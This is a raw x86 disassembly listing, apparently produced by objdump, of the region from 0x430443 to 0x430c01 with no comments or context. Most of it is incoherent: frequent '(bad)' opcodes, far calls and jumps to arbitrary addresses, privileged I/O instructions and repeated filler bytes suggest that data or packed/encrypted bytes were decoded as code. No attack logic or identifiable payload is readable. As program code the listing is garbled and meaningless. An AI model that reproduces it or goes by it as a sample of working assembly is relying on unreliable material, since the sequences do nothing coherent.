  430443:	xor    edi,DWORD PTR [ebp-0x41]
  430446:	jmp    0x4304ba
  430448:	mov    eax,DWORD PTR [eax]
  43044a:	mov    eax,0x339545c7
  43044f:	inc    DWORD PTR [ebx]
  430451:	push   DWORD PTR [ecx]
  430453:	xor    eax,0x50eb008b
  430458:	mov    eax,DWORD PTR [ebp-0x3c]
  43045b:	mov    eax,eax
  43045d:	cld    
  43045e:	clc    
  43045f:	ret    
  430460:	test   bh,al
  430462:	pop    es
  430463:	xchg   ebp,eax
  430464:	add    bh,bh
  430466:	inc    ebp
  430467:	dec    DWORD PTR [edi]
  430469:	pop    ds
  43046a:	sub    eax,DWORD PTR [eax]
  43046c:	add    BYTE PTR [eax+0x76],dl
  43046f:	push   ebp
  430470:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  430476:	or     al,0xcf
  430478:	inc    eax
  430479:	enter  0x745,0x72
  43047d:	inc    ebp
  43047e:	mov    eax,DWORD PTR [ecx]
  430480:	int3   
  430481:	add    BYTE PTR [ebp-0x75],al
  430484:	xor    eax,0xc74d9cb8
  430489:	xor    edx,eax
  43048b:	lea    eax,[ebp+0x4572f808]
  430491:	add    BYTE PTR [ebx-0x3c7423bb],cl
  430497:	fadd   st,st(6)
  430499:	rol    BYTE PTR [ebp+0x12],0x8b
  43049d:	inc    ebp
  43049e:	fmul   QWORD PTR [ebx-0x3c39233d]
  4304a4:	inc    ebp
  4304a5:	test   bh,al
  4304a7:	call   0xdcf8:0x898532f8
  4304ae:	inc    ebp
  4304af:	inc    ebp
  4304b0:	cmp    esi,DWORD PTR [ebx]
  4304b2:	pushf  
  4304b3:	mov    ecx,0xffb48dc7
  4304b8:	test   eax,ecx
  4304ba:	clc    
  4304bb:	dec    ebp
  4304bc:	inc    ebp
  4304bd:	mov    edi,DWORD PTR [ecx]
  4304bf:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  4304c6:	test   edi,edi
  4304c8:	clc    
  4304c9:	test   DWORD PTR [ebp+0x45],0x89c8b3f
  4304d0:	(bad)  
  4304d1:	enter  0x18e8,0x85
  4304d5:	xor    eax,0xff459cf8
  4304da:	mov    edi,esp
  4304dc:	lock inc ebp
  4304de:	ret    
  4304df:	push   eax
  4304e0:	(bad)  
  4304e1:	idiv   BYTE PTR [ebp+0x0]
  4304e4:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4304ea:	add    BYTE PTR [ebx],dl
  4304ec:	jmp    0xce063e
  4304f1:	les    eax,FWORD PTR [ebp-0x35]
  4304f4:	mov    ecx,esi
  4304f6:	lock or al,cl
  4304f9:	clc    
  4304fa:	inc    ebp
  4304fb:	add    esi,DWORD PTR [ebx]
  4304fd:	jge    0x430502
  4304ff:	xor    edi,DWORD PTR [ebx]
  430501:	cmp    ecx,DWORD PTR [edi]
  430503:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  430508:	mov    edi,DWORD PTR [ecx]
  43050a:	test   al,0xcc
  43050c:	dec    ebp
  43050d:	test   BYTE PTR [ebx],dh
  43050f:	pop    es
  430510:	xor    eax,DWORD PTR [eax]
  430512:	add    ecx,DWORD PTR [esi]
  430514:	add    ecx,eax
  430516:	psraw  mm0,mm1
  430519:	sub    BYTE PTR [ebp+0x38],cl
  43051c:	mov    edi,DWORD PTR [ebx]
  43051e:	lock int3 
  430520:	shl    edx,1
  430522:	rol    BYTE PTR [ebp+0xc],1
  430525:	mov    DWORD PTR [ebp-0x24],0xf8038533
  43052c:	jmp    0x770576
  430531:	pushf  
  430532:	inc    ebp
  430533:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  430539:	xor    ecx,ebx
  43053b:	add    ecx,esi
  43053d:	mov    esi,eax
  43053f:	enter  0x45af,0x8b
  430543:	xor    ecx,eax
  430545:	add    edx,DWORD PTR [ebp-0x77]
  430548:	sub    ecx,DWORD PTR [eax]
  43054a:	cmp    eax,DWORD PTR [ebp+0x77]
  43054d:	aad    0x8b
  43054f:	pushf  
  430550:	test   al,0xc7
  430552:	mov    DWORD PTR [eax-0x7747b00],ebp
  430558:	lods   al,BYTE PTR ds:[esi]
  430559:	inc    ebp
  43055a:	dec    ebp
  43055b:	cmp    dh,BYTE PTR [ebx]
  43055d:	pushf  
  43055e:	xor    eax,edi
  430560:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  430567:	inc    ebp
  430568:	dec    ebp
  430569:	cmp    BYTE PTR [ebx-0x2e380f64],cl
  43056f:	mov    esp,0xf80585d0
  430574:	inc    ebp
  430575:	inc    ebp
  430576:	jmp    0x4305b6
  430578:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43057f:	dec    ebp
  430580:	xor    esi,DWORD PTR [ebx]
  430582:	add    eax,DWORD PTR [ebx]
  430584:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43058a:	dec    ebp
  43058b:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430591:	out    dx,eax
  430592:	rol    BYTE PTR [eax],1
  430594:	add    eax,0xebc8458b
  430599:	dec    ebp
  43059a:	mov    ebp,DWORD PTR [ebx]
  43059c:	mov    esp,0x33f84d8b
  4305a1:	ret    
  4305a2:	xor    eax,esi
  4305a4:	add    ecx,eax
  4305a6:	add    eax,DWORD PTR [edx+0xc1010f]
  4305ac:	dec    ebp
  4305ad:	inc    ebp
  4305ae:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4305b4:	ror    bl,1
  4305b6:	add    eax,0xebc645ce
  4305bb:	scas   eax,DWORD PTR es:[edi]
  4305bc:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4305c2:	xor    ebp,DWORD PTR [ebx]
  4305c4:	xor    edi,DWORD PTR [ebx]
  4305c6:	add    esi,DWORD PTR [edi+0x3]
  4305c9:	mov    ecx,DWORD PTR [edi]
  4305cb:	clc    
  4305cc:	rol    ebx,0x4d
  4305cf:	(bad)  
  4305d0:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4305d7:	mov    ah,0x45
  4305d9:	dec    ebp
  4305da:	jbe    0x43060f
  4305dc:	mov    esi,DWORD PTR [ebx]
  4305de:	call   0x334652e6
  4305e3:	rdpmc  
  4305e5:	rol    DWORD PTR [ebx],0x4d
  4305e8:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4305ee:	inc    ebp
  4305ef:	ror    BYTE PTR [ebx+0x45450808],1
  4305f5:	jmp    0x10b0685
  4305fa:	inc    ebp
  4305fb:	inc    ebp
  4305fc:	(bad)  
  4305fd:	mov    ebx,eax
  4305ff:	clc    
  430600:	test   ebx,eax
  430602:	clc    
  430603:	retf   
  430604:	inc    ebp
  430605:	into   
  430606:	mov    esi,0x8b85afec
  43060c:	clc    
  43060d:	enter  0x5545,0x3b
  430611:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  430618:	ret    
  430619:	mov    ah,0xc6
  43061b:	addr16 push 0x338b4545
  430621:	clc    
  430622:	add    eax,ebx
  430624:	loopne 0x4305f1
  430626:	dec    ebp
  430627:	into   
  430628:	mov    al,dh
  43062a:	or     BYTE PTR [edi-0x37ff748e],ch
  430630:	inc    ebp
  430631:	push   ebp
  430632:	mov    ebp,DWORD PTR [ebx]
  430634:	in     al,dx
  430635:	cmp    eax,ebx
  430637:	ja     0x43067e
  430639:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  43063f:	inc    ebp
  430640:	call   0xd7c3:0x88f8328b
  430647:	retf   
  430648:	inc    ebp
  430649:	into   
  43064a:	mov    eax,esi
  43064c:	in     al,dx
  43064d:	scas   eax,DWORD PTR es:[edi]
  43064e:	retf   
  43064f:	mov    ecx,DWORD PTR [ebp-0x38]
  430652:	mov    edx,DWORD PTR [ebp-0x24]
  430655:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8866]
  43065c:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430663:	mov    eax,DWORD PTR [ebx]
  430665:	clc    
  430666:	loopne 0x43062b
  430668:	push   ebp
  430669:	retf   
  43066a:	mov    dh,al
  43066c:	adc    esi,ecx
  43066e:	jb     0x43061f
  430670:	add    BYTE PTR [ebx+0x558bc845],cl
  430676:	in     al,dx
  430677:	sub    eax,ebx
  430679:	cmp    ecx,ebx
  43067b:	mov    eax,esi
  43067d:	mov    esp,0x45af03ce
  430682:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  430688:	mov    eax,ebx
  43068a:	in     al,dx
  43068b:	into   
  43068c:	dec    ebp
  43068d:	(bad)  
  43068e:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430694:	rol    DWORD PTR [ebp+0x4d],0x89
  430698:	xor    esp,esp
  43069a:	sub    eax,DWORD PTR [ebp-0x75]
  43069d:	add    ebp,esp
  43069f:	mov    al,0x55
  4306a1:	inc    ebp
  4306a2:	xor    esi,DWORD PTR ds:0x890f9c03
  4306a8:	retf   0x55dc
  4306ab:	inc    ebp
  4306ac:	xor    esi,DWORD PTR [ebx+ebp*1]
  4306af:	pushf  
  4306b0:	(bad)  
  4306b1:	(bad)  
  4306b2:	adc    eax,eax
  4306b4:	jb     0x43063b
  4306b6:	add    al,bh
  4306b8:	enter  0x8645,0x33
  4306bc:	inc    DWORD PTR [ebx]
  4306be:	(bad)  
  4306bf:	jmp    0x430706
  4306c1:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4306c7:	inc    ebp
  4306c8:	(bad)  
  4306c9:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4306cf:	call   0xb4d:0x88c132cb
  4306d6:	lea    eax,[ebp+0x8]
  4306d9:	xor    esi,DWORD PTR [edx+0x3]
  4306dc:	add    al,ah
  4306de:	inc    ebp
  4306df:	dec    ebp
  4306e0:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4306e6:	data16 add ch,cl
  4306e9:	inc    ebp
  4306ea:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4306f0:	inc    ebp
  4306f1:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4306f7:	push   ebp
  4306f8:	(bad)  
  4306f9:	mov    BYTE PTR [edi+0xf723b11],ch
  4306ff:	add    ch,ch
  430701:	inc    ebp
  430702:	dec    DWORD PTR [ebx-0x34332775]
  430708:	add    al,0x4d
  43070a:	inc    ebp
  43070b:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  430711:	call   0xc000:0x8b003201
  430718:	add    BYTE PTR [ebp-0x1],cl
  43071b:	xor    ecx,esp
  43071d:	xor    eax,DWORD PTR [eax]
  43071f:	add    edx,DWORD PTR [eax+0x3]
  430722:	mov    DWORD PTR [edi],ecx
  430724:	call   0x4288c7ea
  430729:	mov    DWORD PTR [ebp-0x20],esp
  43072c:	add    BYTE PTR [ebp+0x7d],al
  43072f:	mov    eax,DWORD PTR [eax]
  430731:	in     al,0x15
  430733:	ret    
  430734:	iret   
  430735:	(bad)  
  430736:	enter  0x14af,0x8b
  43073a:	(bad)  
  43073b:	in     al,dx
  43073c:	or     bl,cl
  43073e:	adc    cl,al
  430740:	push   ebp
  430741:	dec    ebp
  430742:	inc    eax
  430743:	mov    edx,DWORD PTR [ebp-0x20]
  430746:	jb     0x430713
  430748:	mov    ecx,esi
  43074a:	cld    
  43074b:	scas   eax,DWORD PTR es:[edi]
  43074c:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430753:	mov    BYTE PTR [eax],0x8c
  430756:	push   0xffffff9a
  430758:	push   edi
  430759:	xor    dl,BYTE PTR [eax+0x3b]
  43075c:	mov    ecx,DWORD PTR [edi]
  43075e:	call   0x8c424cc1
  430763:	mov    eax,eax
  430765:	in     al,dx
  430766:	jge    0x4307b5
  430768:	mov    DWORD PTR [ebx],esi
  43076a:	int3   
  43076b:	add    eax,DWORD PTR [ebp+0xf]
  43076e:	xor    eax,ecx
  430770:	(bad)  
  430771:	dec    ebp
  430772:	pushf  
  430773:	xor    ecx,esp
  430775:	add    edi,DWORD PTR [edi]
  430777:	mov    eax,DWORD PTR [ebp-0x38]
  43077a:	aam    0x84
  43077c:	aam    0x9a
  43077e:	add    esi,DWORD PTR [edx]
  430780:	jmp    0x43070b
  430782:	mov    cl,al
  430784:	add    eax,0x14330f45
  430789:	mov    ecx,0xff458d80
  43078e:	jmp    0xc990175b
  430793:	mov    edx,ecx
  430795:	rol    BYTE PTR [ebp+0x330155],1
  43079b:	add    ecx,DWORD PTR [ebp+0xf]
  43079e:	xor    eax,edx
  4307a0:	(bad)  
  4307a1:	ror    DWORD PTR [eax],0x86
  4307a4:	jb     0x4307a3
  4307a6:	add    bh,bh
  4307a8:	clc    
  4307a9:	inc    ebp
  4307aa:	jb     0x430816
  4307ac:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4307b2:	xor    eax,0xc7d89c8b
  4307b7:	add    al,al
  4307b9:	push   0xf830c3
  4307be:	inc    ebp
  4307bf:	jne    0x4307f6
  4307c1:	push   0xffffff9c
  4307c3:	inc    edi
  4307c5:	adc    al,0xe8
  4307c7:	inc    ebp
  4307c8:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4307ce:	mov    ecx,DWORD PTR [eax]
  4307d0:	cld    
  4307d1:	or     DWORD PTR [ebp-0x34],0x33
  4307d5:	jbe    0x4307da
  4307d7:	mov    edx,DWORD PTR [ecx+0x2b]
  4307da:	dec    ebp
  4307db:	mov    cl,BYTE PTR [ebx+0x45d801]
  4307e1:	mov    BYTE PTR [ebx],dh
  4307e3:	mov    eax,DWORD PTR [ebx]
  4307e5:	or     BYTE PTR [ecx+0x3b],dl
  4307e8:	dec    ebp
  4307e9:	int3   
  4307ea:	xor    ebp,edi
  4307ec:	add    eax,DWORD PTR [ebp+0x51]
  4307ef:	mov    ecx,DWORD PTR [ebp-0x28]
  4307f2:	xor    eax,DWORD PTR [eax]
  4307f4:	add    ebp,DWORD PTR [eax+0x51]
  4307f7:	adc    BYTE PTR [eax+0x0],0x8b
  4307fb:	add    BYTE PTR [ebx+0x4d18fcff],cl
  430801:	inc    ebp
  430802:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  430808:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  43080e:	dec    ebp
  43080f:	mov    esi,DWORD PTR [ebx]
  430811:	hlt    
  430812:	add    eax,ebx
  430814:	push   ecx
  430815:	inc    ebp
  430816:	dec    ebp
  430817:	aam    0xff
  430819:	aam    0xe4
  43081b:	(bad)  
  43081c:	retf   
  43081d:	mov    al,ds:0xc1ff39ce
  430822:	adc    al,0xc6
  430824:	inc    ebp
  430825:	and    eax,0x9c0f4c85
  43082a:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  430831:	cmp    BYTE PTR [ebx+0x39],0x0
  430835:	mov    dh,0xc7
  430837:	cmp    eax,eax
  430839:	jne    0x45440085
  43083f:	mov    edi,DWORD PTR [ebx]
  430841:	mov    eax,0x848bcb9c
  430846:	rcr    BYTE PTR [edx-0x7c7fcd0f],0x66
  43084d:	or     BYTE PTR [edi],cl
  43084f:	(bad)  
  430850:	dec    ebp
  430851:	inc    edi
  430852:	add    bh,0x53
  430855:	or     cl,ch
  430857:	test   DWORD PTR [eax+0x4d4501f8],ecx
  43085d:	xchg   BYTE PTR [eax-0x1638ac64],al
  430863:	mov    esp,0xf802b588
  430868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430869:	inc    ebp
  43086a:	(bad)  
  43086b:	cmp    edi,edi
  43086d:	pushf  
  43086e:	or     DWORD PTR [ecx+0x45ffe474],0x0
  430875:	mov    ecx,DWORD PTR [ebp-0x340018]
  43087b:	into   
  43087c:	dec    DWORD PTR [ebx-0x7f72431c]
  430882:	push   0x5000ff01
  430887:	retf   
  430888:	inc    ebp
  430889:	into   
  43088a:	dec    DWORD PTR [ebx-0x343f3ff4]
  430890:	push   eax
  430891:	into   
  430892:	call   0x4b0d22
  430897:	retf   
  430898:	add    dh,cl
  43089a:	add    bh,bh
  43089c:	mov    DWORD PTR [eax+ecx*1],edx
  43089f:	clc    
  4308a0:	inc    ebp
  4308a1:	inc    ebp
  4308a2:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4308a8:	push   0x1
  4308aa:	push   edi
  4308ab:	add    BYTE PTR [eax-0x35],dl
  4308ae:	mov    ecx,esi
  4308b0:	cld    
  4308b1:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4308b7:	into   
  4308b8:	ror    BYTE PTR [ebx+0x75000800],0x50
  4308bf:	xor    eax,DWORD PTR [ebp+0x3]
  4308c2:	jne    0x430915
  4308c4:	call   DWORD PTR [eax-0x3c]
  4308c7:	mov    DWORD PTR [ecx-0x18],edx
  4308ca:	mov    edi,edi
  4308cc:	call   0x8b464e55
  4308d1:	add    ah,ah
  4308d3:	rol    BYTE PTR [ebp-0x7c],0xeb
  4308d7:	add    edi,edi
  4308d9:	add    al,ch
  4308db:	inc    ebp
  4308dc:	push   ecx
  4308dd:	cmp    cl,BYTE PTR [ebx+0x45c7c49c]
  4308e3:	mov    al,0xc7
  4308e5:	test   esp,esp
  4308e7:	clc    
  4308e8:	test   DWORD PTR [ebp-0x8],ecx
  4308eb:	add    BYTE PTR [ebp+0x53],0x34
  4308ef:	jmp    0x8bcc9190
  4308f4:	in     al,dx
  4308f5:	or     BYTE PTR [ebp-0xf],al
  4308f8:	xor    eax,DWORD PTR [eax+0x4f896603]
  4308fe:	hlt    
  4308ff:	mov    eax,DWORD PTR [ebp-0x50]
  430902:	xor    esi,ecx
  430904:	add    eax,DWORD PTR [eax+0x4f086689]
  43090a:	inc    ebp
  43090b:	adc    ebp,0x68
  43090e:	pushf  
  43090f:	inc    edi
  430911:	add    al,ch
  430913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430914:	test   edi,edi
  430916:	clc    
  430917:	inc    DWORD PTR [ebp-0x73]
  43091a:	cmp    dh,BYTE PTR [esp+ebx*4-0x1]
  43091e:	(bad)  
  43091f:	push   ecx
  430920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430921:	jne    0x4308a8
  430923:	push   eax
  430924:	clc    
  430925:	test   DWORD PTR [ebp-0x1],eax
  430928:	cmp    bh,bh
  43092a:	pushf  
  43092b:	mov    eax,edi
  43092d:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  430934:	inc    ebp
  430935:	push   edi
  430936:	sbb    bl,BYTE PTR ds:[eax+eax*1-0x7f1b9775]
  43093e:	dec    ebp
  43093f:	add    BYTE PTR [ebx],dh
  430941:	inc    ebp
  430942:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  430948:	enter  0x8401,0x0
  43094c:	add    al,BYTE PTR [eax]
  43094e:	add    bh,bh
  430950:	out    dx,eax
  430951:	sbb    BYTE PTR [eax],al
  430953:	dec    ebp
  430954:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  43095a:	sub    esi,DWORD PTR [ebx]
  43095c:	mov    ebp,DWORD PTR [eax-0x8]
  43095f:	add    bl,0x0
  430962:	(bad)  
  430963:	cmp    eax,ecx
  430965:	or     BYTE PTR [edx+0x750114],al
  43096b:	inc    DWORD PTR [ebp+0x18]
  43096e:	mov    eax,DWORD PTR [ebp-0x8]
  430971:	mov    ebx,eax
  430973:	(bad)  
  430974:	retf   
  430975:	inc    ebp
  430976:	into   
  430977:	mov    esi,eax
  430979:	int3   
  43097a:	scas   eax,DWORD PTR es:[edi]
  43097b:	push   es
  43097c:	mov    esi,DWORD PTR [ebp-0xc]
  43097f:	call   DWORD PTR [ebp+0x18]
  430982:	sub    edi,DWORD PTR [ebp+0x3b]
  430985:	mov    esi,DWORD PTR [edi-0x34]
  430988:	mov    eax,DWORD PTR [ebp-0x8]
  43098b:	xor    eax,0xc7c69cc3
  430990:	mov    esp,0x8b8500dc
  430995:	clc    
  430996:	mov    esp,0x338b4d45
  43099b:	in     al,0x33
  43099d:	ret    
  43099e:	add    eax,esi
  4309a0:	add    eax,DWORD PTR [ebp+0xf]
  4309a3:	mov    eax,ecx
  4309a5:	in     al,0x4d
  4309a7:	ret    
  4309a8:	mov    eax,esi
  4309aa:	in     al,dx
  4309ab:	inc    ebp
  4309ac:	rol    edi,1
  4309ae:	sar    al,1
  4309b0:	or     BYTE PTR [ebp+0x45e9f845],al
  4309b6:	add    BYTE PTR [ebx],bh
  4309b8:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  4309bf:	test   ebx,eax
  4309c1:	clc    
  4309c2:	retf   
  4309c3:	inc    ebp
  4309c4:	into   
  4309c5:	cmp    esi,eax
  4309c7:	pushf  
  4309c8:	scas   eax,DWORD PTR es:[edi]
  4309c9:	(bad)  
  4309ca:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  4309d1:	inc    ebp
  4309d2:	cmp    edi,DWORD PTR [edi]
  4309d4:	ja     0x430972
  4309d6:	mov    eax,edi
  4309d8:	mov    esp,0x458567a8
  4309dd:	clc    
  4309de:	mov    eax,DWORD PTR [ebp-0x8]
  4309e1:	mov    eax,ebx
  4309e3:	in     al,dx
  4309e4:	retf   
  4309e5:	ret    
  4309e6:	into   
  4309e7:	mov    dh,0x7d
  4309ea:	scas   eax,DWORD PTR es:[edi]
  4309eb:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  4309f1:	add    BYTE PTR [ebx],ch
  4309f3:	jmp    0xba0b33
  4309f8:	mov    eax,DWORD PTR [ebp-0x5c]
  4309fb:	mov    eax,DWORD PTR [ebp-0x14]
  4309fe:	inc    ebp
  4309ff:	enter  0x458b,0xf8
  430a03:	xor    eax,ebx
  430a05:	add    ecx,ebx
  430a07:	cmp    ecx,esi
  430a09:	shufps xmm7,xmm4,0xaf
  430a0d:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430a13:	dec    ebp
  430a14:	sub    esi,DWORD PTR [ebx]
  430a16:	cmp    esi,DWORD PTR [ebx]
  430a18:	ja     0x430a1d
  430a1a:	mov    eax,DWORD PTR [ebx]
  430a1c:	lods   al,BYTE PTR ds:[esi]
  430a1d:	mov    db0,ecx
  430a20:	inc    ebp
  430a21:	dec    ebp
  430a22:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430a28:	retf   
  430a29:	rol    dh,1
  430a2b:	or     al,0xce
  430a2d:	inc    ebp
  430a2e:	scas   eax,DWORD PTR es:[edi]
  430a2f:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430a35:	add    BYTE PTR [ebx],ch
  430a37:	add    BYTE PTR [ebx],bh
  430a39:	inc    ebp
  430a3a:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430a40:	inc    ebp
  430a41:	retf   
  430a42:	mov    ecx,esi
  430a44:	clc    
  430a45:	(bad)  
  430a46:	retf   
  430a47:	scas   eax,DWORD PTR es:[edi]
  430a48:	ret    
  430a49:	mov    ecx,esi
  430a4b:	hlt    
  430a4c:	(bad)  
  430a4d:	push   ebp
  430a4e:	scas   eax,DWORD PTR es:[edi]
  430a4f:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430a55:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430a5b:	add    BYTE PTR [ebx],al
  430a5d:	mov    eax,eax
  430a5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a60:	inc    ebp
  430a61:	dec    ebp
  430a62:	xor    eax,0x89339c33
  430a67:	add    edx,eax
  430a69:	add    eax,DWORD PTR [ebp+0xf]
  430a6c:	xor    al,0xc1
  430a6e:	pushf  
  430a6f:	dec    ebp
  430a70:	(bad)  
  430a71:	mov    esi,DWORD PTR [eax-0x72e7a14]
  430a77:	rol    BYTE PTR [ebp+0x5],1
  430a7a:	xor    eax,DWORD PTR [ebp+0x3]
  430a7d:	jmp    0x430a6a
  430a7f:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430a85:	xor    eax,DWORD PTR [ebp+0x33]
  430a88:	mov    eax,DWORD PTR [ebx]
  430a8a:	rol    BYTE PTR [ebx],1
  430a8c:	test   BYTE PTR [edi],cl
  430a8e:	call   0xb8b:0x884d32c1
  430a95:	in     al,dx
  430a96:	inc    ebp
  430a97:	shl    DWORD PTR [ebx],1
  430a99:	rol    BYTE PTR [ebx],1
  430a9b:	add    eax,0xeb4d45e0
  430aa0:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430aa6:	add    BYTE PTR [ebx],dh
  430aa8:	inc    ebp
  430aa9:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430aaf:	rdpmc  
  430ab1:	rol    DWORD PTR [ebx],0x4d
  430ab4:	loopne 0x430a41
  430ab6:	push   ebp
  430ab7:	in     al,dx
  430ab8:	mov    cl,dl
  430aba:	adc    eax,edx
  430abc:	jb     0x430ac3
  430abe:	add    BYTE PTR [ebp+0x45],al
  430ac1:	jmp    0x430a4e
  430ac3:	mov    ebx,eax
  430ac5:	test   al,0xcb
  430ac7:	dec    ebp
  430ac8:	dec    ebp
  430ac9:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430acf:	add    ebx,DWORD PTR [edx-0x743ecdf1]
  430ad5:	dec    ebp
  430ad6:	mov    al,0x8b
  430ad8:	dec    ebp
  430ad9:	in     al,dx
  430ada:	xor    edx,ecx
  430adc:	xor    edx,eax
  430ade:	add    eax,DWORD PTR [ebp+0x3]
  430ae1:	jbe    0x430af2
  430ae3:	mov    eax,ecx
  430ae5:	test   al,0x45
  430ae7:	dec    ebp
  430ae8:	mov    DWORD PTR [ebx],esi
  430aea:	loopne 0x430b1f
  430aec:	inc    ebp
  430aed:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430af3:	rol    esi,0x45
  430af6:	scas   eax,DWORD PTR es:[edi]
  430af7:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430afd:	mov    eax,ecx
  430aff:	hlt    
  430b00:	dec    ebp
  430b01:	inc    ebp
  430b02:	mov    eax,edi
  430b04:	loopne 0x430ade
  430b06:	retf   
  430b07:	test   esi,ecx
  430b09:	clc    
  430b0a:	scas   eax,DWORD PTR es:[edi]
  430b0b:	inc    ebp
  430b0c:	mov    eax,edi
  430b0e:	fdiv   st,st(0)
  430b10:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430b16:	call   0xf8b:0x3b9c323b
  430b1d:	fcomp  DWORD PTR [esi-0x3d]
  430b20:	inc    esi
  430b22:	mov    ebp,DWORD PTR [eax-0x10]
  430b25:	inc    ebp
  430b26:	dec    ebp
  430b27:	xor    esi,DWORD PTR [ebx]
  430b29:	add    eax,DWORD PTR [ebx]
  430b2b:	loopne 0x430b3c
  430b2d:	dec    ebp
  430b2e:	ror    DWORD PTR [edx+0x7233084d],0x3
  430b35:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430b3b:	lock call 0xf48b:0x894532c3
  430b43:	rol    BYTE PTR [ebp-0x7c],1
  430b46:	xor    ebx,DWORD PTR [edx-0x7772cd47]
  430b4c:	call   edi
  430b4e:	enter  0x4d45,0x8b
  430b52:	mov    esi,eax
  430b54:	fmul   st(3),st
  430b56:	push   ebp
  430b57:	dec    ebp
  430b58:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430b5e:	ret    0xc19a
  430b61:	xor    al,BYTE PTR [esi-0x280276]
  430b67:	dec    ebp
  430b68:	jne    0x430b9d
  430b6a:	mov    eax,DWORD PTR [ebx]
  430b6c:	cld    
  430b6d:	loopne 0x430b1f
  430b6f:	push   ebp
  430b70:	add    DWORD PTR [eax+0x72851100],ecx
  430b76:	inc    DWORD PTR [eax]
  430b78:	inc    DWORD PTR [ebp-0x75]
  430b7b:	mov    edi,esp
  430b7d:	lock add bl,0x1
  430b81:	retf   
  430b82:	add    dh,al
  430b84:	xor    dh,cl
  430b86:	inc    ebp
  430b87:	scas   eax,DWORD PTR es:[edi]
  430b88:	mov    eax,DWORD PTR [ebx]
  430b8a:	shl    al,0x0
  430b8d:	inc    ebp
  430b8e:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430b94:	call   0x461dcc
  430b99:	ud0    eax,ecx
  430b9c:	adc    al,0x4d
  430b9e:	inc    ebp
  430b9f:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430ba5:	lock push 0x338055
  430bab:	add    eax,DWORD PTR [eax]
  430bad:	ud0    ecx,edx
  430bb0:	sbb    BYTE PTR [ebp+0x5e],dl
  430bb3:	xor    ecx,ecx
  430bb5:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430bbc:	push   ecx
  430bbd:	add    BYTE PTR [ebp-0x38],cl
  430bc0:	mov    DWORD PTR [esi-0x740004],eax
  430bc6:	cld    
  430bc7:	inc    ebp
  430bc8:	xchg   ebx,eax
  430bc9:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  430bcf:	xabort 0xaf
  430bd2:	icebp  
  430bd3:	mov    esi,DWORD PTR [ebp-0x28]
  430bd6:	(bad)  
  430bd7:	retf   
  430bd8:	or     ecx,eax
  430bda:	(bad)  
  430bdb:	dec    ebp
  430bdc:	pop    es
  430bdd:	(bad)  
  430bde:	(bad)  
  430bdf:	or     BYTE PTR [esi],al
  430be1:	jb     0x430ba9
  430be3:	add    BYTE PTR [ebx],al
  430be5:	inc    ebp
  430be6:	(bad)  
  430be7:	mov    ecx,DWORD PTR [edx]
  430be9:	fadd   st(6),st
  430beb:	ret    
  430bec:	add    ah,BYTE PTR [esi-0x37]
  430bef:	int    0x55
  430bf1:	sub    ebp,esp
  430bf3:	add    edx,DWORD PTR [ecx-0x14]
  430bf6:	inc    ebp
  430bf7:	inc    ebp
  430bf8:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430bfe:	cld    
  430bff:	(bad)  
  430c00:	(bad)  
  430c01:	scas   eax,DWORD PTR es:[edi]
